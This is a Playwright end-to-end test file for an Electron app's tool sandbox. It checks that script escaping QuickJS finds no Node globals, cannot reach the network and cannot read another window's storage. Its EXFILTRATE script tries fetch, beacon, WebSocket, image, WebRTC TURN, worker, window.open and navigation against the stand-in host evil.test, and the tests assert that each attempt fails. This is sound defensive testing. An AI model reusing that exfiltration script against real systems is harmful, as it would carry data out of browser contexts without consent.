// The sandbox's second layer (docs/sandbox.md#what-an-escape-reaches): a script run directly in a
// sandbox window, as if tool code had broken out of QuickJS, in the preload's world and in the
// page's. It must find no Node, make no request by any route a renderer has (counted at evil.test's
// door, which the e2e launch resolves to 127.0.0.1, so anything let out would arrive), and find
// nothing another window left behind, and nothing of one may be on disk. (The journey suite runs
// the whole Woolworths path through the sandbox.)

import { readdirSync, rmSync } from 'node:fs'
import { connect, createServer, type Server } from 'node:net'
import { join } from 'node:path'
import { expect, type Page, test } from '@playwright/test'
import { type ExfilSink, startExfilSink } from '@valet/fake-woolworths-site'
import {
  appWindows,
  CONTROL,
  connectMcp,
  type Launched,
  launch,
  type McpClient,
  tempDir,
  windowWithTitle,
} from './harness'

test.describe.configure({ mode: 'serial' })

let userData: string
let launched: Launched
let control: Page
let client: McpClient
let sink: ExfilSink
let door: Server
let doorPort = 0
let connections = 0

test.beforeAll(async () => {
  sink = await startExfilSink({ hostname: 'evil.test' })
  door = createServer((socket) => {
    connections += 1
    const upstream = connect(sink.port, '127.0.0.1')
    socket.on('error', () => upstream.destroy())
    upstream.on('error', () => socket.destroy())
    socket.pipe(upstream).pipe(socket)
  })
  await new Promise<void>((done) => door.listen(0, '127.0.0.1', done))
  const address = door.address()
  doorPort = typeof address === 'object' && address !== null ? address.port : 0
  userData = tempDir('sandbox')
  launched = await launch(userData)
  control = await windowWithTitle(launched.app, CONTROL)
  client = await connectMcp(control, userData)
})

test.afterAll(async () => {
  await client?.close().catch(() => undefined)
  await launched?.close()
  if (userData !== undefined) rmSync(userData, { recursive: true, force: true })
  await sink?.close()
  door?.close()
})

// biome-ignore lint/correctness/noEmptyPattern: Playwright needs the fixtures argument destructured
test.afterEach(async ({}, testInfo) => {
  if (testInfo.status !== testInfo.expectedStatus) {
    for (const [i, page] of appWindows(launched.app).entries())
      await page.screenshot({ path: testInfo.outputPath(`window-${i}.png`) }).catch(() => undefined)
    await testInfo.attach('app-log', { body: launched.logs.join('') })
  }
})

function escaped(key: string, source: string, world: 'preload' | 'main' = 'preload'): Promise<unknown> {
  return launched.app.evaluate(
    (_electron, [k, s, w]) =>
      (
        globalThis as unknown as {
          __valetE2eSandbox: { escaped(k: string, s: string, w: string): Promise<unknown> }
        }
      ).__valetE2eSandbox.escaped(k, s, w),
    [key, source, world] as const,
  )
}

/** Every route out a renderer has, at evil.test; each reports how it ended. */
const EXFILTRATE = (port: number) => `(async () => {
  const target = 'evil.test:${port}'
  const out = {}
  const settle = (p) => Promise.race([p.then(() => 'sent', (e) => 'refused'), new Promise((r) => setTimeout(() => r('no answer'), 3000))])
  out.fetchHttp = await settle(fetch('http://' + target + '/fetch'))
  out.fetchHttps = await settle(fetch('https://' + target + '/fetchs'))
  out.beacon = (() => { try { return navigator.sendBeacon('http://' + target + '/beacon', 'x') ? 'queued' : 'refused' } catch { return 'refused' } })()
  out.webSocket = await settle(new Promise((res, rej) => { try { const w = new WebSocket('ws://' + target + '/ws'); w.onopen = res; w.onerror = rej } catch (e) { rej(e) } }))
  out.image = await settle(new Promise((res, rej) => { const i = new Image(); i.onload = res; i.onerror = rej; i.src = 'http://' + target + '/img' }))
  try { const l = document.createElement('link'); l.rel = 'dns-prefetch'; l.href = 'http://' + target; document.head.append(l); const p = document.createElement('link'); p.rel = 'preconnect'; p.href = 'http://' + target; document.head.append(p) } catch {}
  out.rtc = await settle(new Promise((res, rej) => { try { const pc = new RTCPeerConnection({ iceServers: [{ urls: 'turn:' + target + '?transport=tcp', username: 'u', credential: 'c' }] }); pc.createDataChannel('x'); pc.onicecandidate = (e) => { if (e.candidate && e.candidate.type === 'relay') res() }; pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(rej); setTimeout(() => rej(new Error('none')), 2500) } catch (e) { rej(e) } }))
  out.worker = (() => { try { new Worker('data:text/javascript,fetch("http://' + target + '/worker")'); return 'started' } catch { return 'refused' } })()
  out.open = (() => { try { return window.open('http://' + target + '/open') === null ? 'refused' : 'opened' } catch { return 'refused' } })()
  out.navigate = (() => { try { location.href = 'http://' + target + '/nav'; return 'tried' } catch { return 'refused' } })()
  return out
})()`

test('an escaped script finds no Node and no Electron', async () => {
  for (const world of ['preload', 'main'] as const) {
    const found = await escaped(
      'node',
      `JSON.stringify(['require', 'process', 'module', 'Buffer', 'global', '__dirname'].map((n) => [n, typeof globalThis[n]]))`,
      world,
    )
    expect([world, JSON.parse(String(found))]).toEqual([
      world,
      [
        ['require', 'undefined'],
        ['process', 'undefined'],
        ['module', 'undefined'],
        ['Buffer', 'undefined'],
        ['global', 'undefined'],
        ['__dirname', 'undefined'],
      ],
    ])
  }
})

test('an escaped script reaches nothing on the network, by any route', async () => {
  const before = connections
  for (const world of ['preload', 'main'] as const) {
    const outcome = (await escaped('net', EXFILTRATE(doorPort), world)) as Record<string, string>
    expect(outcome['fetchHttp']).not.toBe('sent')
    expect(outcome['fetchHttps']).not.toBe('sent')
    expect(outcome['webSocket']).not.toBe('sent')
    expect(outcome['image']).not.toBe('sent')
    expect(outcome['rtc']).not.toBe('sent')
    expect(outcome['open']).toBe('refused')
  }
  // Give anything queued (a beacon, a prefetch, a worker) time to try.
  await new Promise((r) => setTimeout(r, 3_000))
  expect(connections - before).toBe(0)
  expect(sink.requests).toEqual([])
})

test('an escaped script finds nothing another window left behind', async () => {
  const write = `(async () => {
    const out = {}
    try { localStorage.setItem('valet-marker', 'a'); out.local = 'written' } catch { out.local = 'refused' }
    try { document.cookie = 'valet=a'; out.cookie = document.cookie } catch { out.cookie = 'refused' }
    try { await new Promise((res, rej) => { const r = indexedDB.open('valet', 1); r.onsuccess = res; r.onerror = rej }); out.idb = 'opened' } catch { out.idb = 'refused' }
    try { await caches.open('valet'); out.cache = 'opened' } catch { out.cache = 'refused' }
    return out
  })()`
  const read = `(async () => {
    const out = {}
    try { out.local = localStorage.getItem('valet-marker') } catch { out.local = null }
    try { out.cookie = document.cookie || null } catch { out.cookie = null }
    try { out.idb = (await indexedDB.databases()).map((d) => d.name).join(',') || null } catch { out.idb = null }
    try { out.cache = (await caches.keys()).join(',') || null } catch { out.cache = null }
    return out
  })()`
  await escaped('adapter-a', write)
  expect(await escaped('adapter-b', read)).toEqual({ local: null, cookie: null, idb: null, cache: null })
})

test('nothing of a sandbox window is on disk', async () => {
  const partitions = join(userData, 'Partitions')
  const names = (() => {
    try {
      return readdirSync(partitions)
    } catch {
      return []
    }
  })()
  expect(names.filter((n) => n.startsWith('sandbox'))).toEqual([])
})
